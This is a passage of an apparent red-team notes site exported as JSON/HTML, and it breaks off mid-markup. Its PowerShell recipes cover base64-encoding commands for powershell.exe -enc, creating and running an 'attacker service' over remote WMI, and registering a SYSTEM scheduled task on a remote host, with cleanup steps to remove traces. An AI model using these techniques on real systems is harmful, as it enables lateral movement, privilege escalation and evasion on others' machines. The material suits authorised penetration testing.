DNS querier in the packet capture itself, or from the resolver itself. Using an external resolver can get pretty noisy though.&lt;/p&gt;\n&lt;h3 id=&quot;color-rules&quot;&gt;Color rules&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#color-rules&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Color rules are just filters; they’re matched in order (from top down), with the first matched coloring rule applying. Note that Wireshark is not really consistent about applying new coloring rules — it’s best to reload the file after creating/modifying rules.&lt;/p&gt;"},"spells/Work-with-base64-encoding-using-PowerShell":{"slug":"spells/Work-with-base64-encoding-using-PowerShell","filePath":"spells/Work with base64 encoding using PowerShell.md","title":"Work with base64 encoding using PowerShell","links":[],"tags":["HowTo","Application/PowerShell","Standard/Base64"],"content":"Encode a command to base64 in PowerShell:\n$Text = &quot;$ONE_LINE_POWERSHELL_COMMAND&quot;\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)\n$EncodedText = [Convert]::ToBase64String($Bytes)\nRun this using:\npowershell.exe -enc $EncodedText","richContent":"&lt;p&gt;Encode a command to base64 in PowerShell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ONE_LINE_POWERSHELL_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Bytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::Unicode.GetBytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Text&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;EncodedText&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Convert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::ToBase64String&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;Bytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Run this using:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;powershell.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;enc &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;EncodedText&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Work-with-remote-services-using-WMI-and-PowerShell":{"slug":"spells/Work-with-remote-services-using-WMI-and-PowerShell","filePath":"spells/Work with remote services using WMI and PowerShell.md","title":"Work with remote services using WMI and PowerShell","links":[],"tags":["OS/Windows/WMI","Application/PowerShell","OS/Windows/Services","HowTo"],"content":"# Create $ATTACKER_SERVICE using the WMI session established\n# in $SESSION_OBJECT.\n#\nInvoke-CimMethod -CimSession $SESSION_OBJECT `\n                 -ClassName Win32_Service `\n                 -MethodName Create `\n                 -Arguments @{\n                      Name = &quot;$ATTACKER_SERVICE&quot;;\n                      DisplayName = &quot;$ATTACKER_SERVICE&quot;;\n                      PathName = &quot;$SOME_COMMAND&quot;;\n                      ServiceType = [byte]::Parse(&quot;16&quot;);\n                      StartMode = &quot;Manual&quot;\n                  }\n \n# Get a handle to the new service.\n#\n$SERVICE_OBJECT = Get-CimInstance `\n                      -CimSession $SESSION_OBJECT `\n                      -ClassName Win32_Service `\n                      -filter &quot;Name LIKE &#039;$ATTACKER_SERVICE&#039;&quot;\n \n# Invoke $ATTACKER_SERVICE.\n#\nInvoke-CimMethod -InputObject $SERVICE_OBJECT `\n                 -MethodName StartService\n \n# Make sure that $ATTACKER_SERVICE is really dead.\n#\nInvoke-CimMethod -InputObject $SERVICE_OBJECT `\n                 -MethodName StopService\n \n# Clean up after yourself.\n#\nInvoke-CimMethod -InputObject $SERVICE_OBJECT `\n                 -MethodName Delete","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create $ATTACKER_SERVICE using the WMI session established&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# in $SESSION_OBJECT.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ClassName Win32_Service &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName Create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Arguments &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      Name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      DisplayName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_SERVICE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      PathName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      ServiceType&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; [&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;byte&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::Parse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      StartMode&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Manual&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  }&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get a handle to the new service.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Get-CimInstance&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ClassName Win32_Service &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;filter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Name LIKE &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ATTACKER_SERVICE&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Invoke $ATTACKER_SERVICE.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;InputObject &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName StartService&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make sure that $ATTACKER_SERVICE is really dead.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;InputObject &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName StopService&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Clean up after yourself.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;InputObject &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SERVICE_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName Delete&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Work-with-remote-tasks-using-WMI-and-PowerShell":{"slug":"spells/Work-with-remote-tasks-using-WMI-and-PowerShell","filePath":"spells/Work with remote tasks using WMI and PowerShell.md","title":"Work with remote tasks using WMI and PowerShell","links":[],"tags":["HowTo","Application/PowerShell","OS/Windows/Tasks","AttackCycle/Exploitation","AttackCycle/PrivEsc","OS/Windows/WMI"],"content":"# Create $ATTACKER_TASK using the WMI session established in\n# $SESSION_OBJECT. Note that $SOME_COMMAND must be broken up\n# here into the binary path and the command arguments.\n#\n$TASK_OBJECT = New-ScheduledTaskAction `\n                   -CimSession $SESSION_OBJECT `\n                   -Execute &quot;$SOME_BINARY_PATH&quot; `\n                   -Argument &quot;$SOME_COMMAND_ARGUMENTS&quot;\n \nRegister-ScheduledTask -CimSession $SESSION_OBJECT `\n                       -Action $TASK_OBJECT `\n                       -User &quot;NT AUTHORITY\\SYSTEM&quot; `\n                       -TaskName &quot;$ATTACKER_TASK&quot;\n \n# Invoke $ATTACKER_TASK.\n#\nStart-ScheduledTask -CimSession $SESSION_OBJECT `\n                    -TaskName &quot;$ATTACKER_TASK&quot;\n \n# Clean up after yourself.\n#\nUnregister-ScheduledTask -CimSession $SESSION_OBJECT `\n                         -TaskName &quot;$ATTACKER_TASK&quot;","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create $ATTACKER_TASK using the WMI session established in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# $SESSION_OBJECT. Note that $SOME_COMMAND must be broken up&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# here into the binary path and the command arguments.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TASK_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; New-ScheduledTaskAction&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                   -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                   -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Execute &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_BINARY_PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                   -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Argument &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND_ARGUMENTS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Register-ScheduledTask&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                       -&lt;/span&gt;&lt;span 